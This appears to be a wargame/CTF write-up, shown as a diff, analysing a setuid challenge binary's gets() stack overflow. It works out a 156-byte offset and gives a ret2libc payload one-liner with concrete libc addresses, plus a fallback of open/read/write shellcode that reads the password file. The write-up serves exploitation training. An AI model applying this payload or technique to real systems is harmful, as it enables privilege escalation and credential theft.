@@ -1,10 +1,60 @@
 Level 4 - Source Analysis
 ==========================
 
-Binary name:
-Protection summary (checksec):
-Vulnerability type:
-Root cause:
+Binary name: level04
 
-Simplified code/path explanation:
+Protection summary:
+- 32-bit ELF, setuid challenge binary
+- Stack canary: not present
+- NX: disabled (stack is executable)
+- PIE: disabled (binary text addresses stable)
+
+Vulnerability type:
+- Stack-based buffer overflow via gets()
+
+Root cause:
+- In child process, user input is read with gets() into a fixed-size local buffer:
+	char user_buffer[128];
+	gets(user_buffer);
+- gets() has no length check, so input can overwrite saved EIP.
+
+Main control-flow (important points):
+1) main() forks.
+2) Child:
+	 - prctl(PR_SET_PDEATHSIG, SIGHUP)
+	 - ptrace(PTRACE_TRACEME, ...)
+	 - puts("Give me some shellcode, k")
+	 - gets(user_buffer)
+3) Parent:
+	 - wait() loop + ptrace(PTRACE_PEEKUSER, child, 44, 0)
+	 - if traced syscall == 11 (execve), prints "no exec() for you" and kills child.
+
+Offset calculation (why 156):
+- From disassembly, gets buffer starts at ebp-0x98.
+- Saved return address is at ebp+0x4.
+- Distance to overwrite EIP:
+	(ebp+0x4) - (ebp-0x98) = 0x9c = 156 bytes.
+
+Exploit strategy used here (ret2libc):
+- Overwrite EIP with system() address.
+- Set next return to exit().
+- Pass "/bin/sh" pointer from libc as system() first argument.
+
+Stack layout after overflow:
+- [156 bytes padding]
+- [EIP -> system]
+- [RET for system -> exit]
+- [arg1 for system -> "/bin/sh"]
+
+Addresses collected in gdb session:
+- system = 0xf7e6aed0
+- exit   = 0xf7e5eb70
+- "/bin/sh" = 0xf7f897ec
+
+Payload used:
+python -c 'import struct,sys; sys.stdout.write("A"*156 + struct.pack("<I",0xf7e6aed0) + struct.pack("<I",0xf7e5eb70) + struct.pack("<I",0xf7f897ec) + "\n")'
+
+Notes:
+- '; cat' was appended in pipeline to keep stdin open for interactive shell behavior.
+- If execve filtering blocks this path on a specific run/environment, use ORW shellcode (open/read/write .pass) to avoid syscall 11.
 
